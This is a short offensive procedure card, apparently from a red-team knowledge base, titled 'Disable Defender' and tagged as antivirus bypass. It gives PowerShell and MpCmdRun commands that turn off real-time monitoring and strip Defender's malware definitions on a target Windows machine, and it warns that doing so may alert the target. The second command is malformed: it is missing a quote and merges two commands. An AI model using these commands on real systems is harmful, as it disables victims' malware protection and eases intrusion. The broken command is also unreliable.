---
id: 4e367af7-1ef3-4c2b-8ab8-0a9010427fae
name: Disable Defender
type: procedure
verified: true
submitted: true
created_at: '2023-01-10T04:46:44.859969+00:00'
updated_at: '2023-05-25T19:55:41.712236+00:00'
platforms:
- Windows
tags:
- '[[Antivirus Bypass]]'
commands:
- '[[Disable Defender]]'
- '[[Remove definitions and disable AV protection (Useful when Powershell scripts
  are being blocked by Defender)]]'
---

# Disable Defender

**Status**: ✓ Verified

## Summary

If you have the available permissions attempt to disable defender on the target machine. (Chances are, this is deprecated for newer systems and may alert the target.) 

## Description

# Description

If you have the available permissions attempt to disable defender on the target machine.



(Chances are, this is deprecated for newer systems and may alert the target.)



## Instructions

1. Run the following powershell script





**Command** ([[Disable Defender]]):

```bash
Set-MpPReference -DisableRealtimeMonitoring $true -Verbose
```





2. or if powershell is blocked try the following





**Command** ([[Remove definitions and disable AV protection (Useful when Powershell scripts are being blocked by Defender)]]):

```bash
c:\program files\windows defender\mpcmdrun.exe" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true

```





## Platforms

- Windows

## Commands Used

- [[Disable Defender]]
- [[Remove definitions and disable AV protection (Useful when Powershell scripts are being blocked by Defender)]]

## Tags

- [[Antivirus Bypass]]


